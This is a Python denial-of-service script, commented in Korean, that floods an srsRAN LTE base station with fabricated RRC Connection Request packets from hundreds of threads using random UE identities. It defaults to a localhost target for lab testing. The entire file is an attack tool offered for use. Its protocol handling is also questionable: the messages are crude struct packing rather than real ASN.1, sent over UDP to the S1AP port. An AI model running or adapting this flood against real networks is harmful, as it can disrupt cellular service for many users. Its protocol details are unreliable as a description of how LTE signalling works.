#!/usr/bin/env python3
"""
LTE RRC Connection Flood Attack
srsRAN 환경에서 RRC 연결 요청을 대량으로 전송하여 eNB의 리소스를 고갈시키는 공격
"""

import socket
import struct
import time
import threading
import random
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

class RRCConnectionFlood:
    def __init__(self, target_ip, target_port=36412, num_ues=1000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_ues = num_ues
        self.attack_threads = []
        self.running = False
        
    def generate_ue_identity(self):
        """임의의 UE 식별자 생성"""
        return random.randint(1, 4294967295)  # 32비트 unsigned int 범위
    
    def create_rrc_connection_request(self, ue_id):
        """RRC Connection Request 메시지 생성"""
        # 간단한 RRC Connection Request 패킷 구조
        # 실제로는 더 복잡한 ASN.1 인코딩이 필요
        rrc_msg = struct.pack('>I', ue_id)  # UE ID
        rrc_msg += struct.pack('>H', 0x0001)  # Message Type (Connection Request)
        rrc_msg += struct.pack('>H', 0x0000)  # Establishment Cause
        return rrc_msg
    
    def send_rrc_request(self, ue_id, duration=60):
        """개별 UE의 RRC 연결 요청 전송"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # RRC Connection Request 생성
                rrc_packet = self.create_rrc_connection_request(ue_id)
                
                # UDP 패킷으로 전송
                sock.sendto(rrc_packet, (self.target_ip, self.target_port))
                
                # 랜덤 간격으로 전송 (더 현실적인 패턴)
                time.sleep(random.uniform(0.1, 0.5))
                
            except Exception as e:
                print(f"UE {ue_id} 전송 오류: {e}")
                break
        
        sock.close()
    
    def start_attack(self, duration=60):
        """공격 시작"""
        print(f"RRC Connection Flood 공격 시작...")
        print(f"대상: {self.target_ip}:{self.target_port}")
        print(f"UE 수: {self.num_ues}")
        print(f"지속 시간: {duration}초")
        
        self.running = True
        
        # 각 UE에 대해 별도 스레드 생성
        for i in range(self.num_ues):
            ue_id = self.generate_ue_identity()
            thread = threading.Thread(
                target=self.send_rrc_request, 
                args=(ue_id, duration)
            )
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
            # 스레드 생성 간격 조절
            time.sleep(0.01)
        
        print(f"{self.num_ues}개 UE 스레드 시작됨")
        
        # 공격 지속 시간 대기
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        print("공격 중지 중...")
        self.running = False
        
        # 모든 스레드 종료 대기
        for thread in self.attack_threads:
            thread.join(timeout=1)
        
        print("공격 완료")

def main():
    # 공격 대상 설정 (srsRAN eNB IP)
    target_ip = "127.0.0.1"  # 로컬 테스트용
    target_port = 36412      # srsRAN eNB 기본 포트
    
    # 공격 파라미터
    num_ues = 500           # 동시 UE 수
    duration = 120          # 공격 지속 시간 (초)
    
    # 공격 실행
    attack = RRCConnectionFlood(target_ip, target_port, num_ues)
    
    try:
        attack.start_attack(duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attack.stop_attack()

if __name__ == "__main__":
    main()
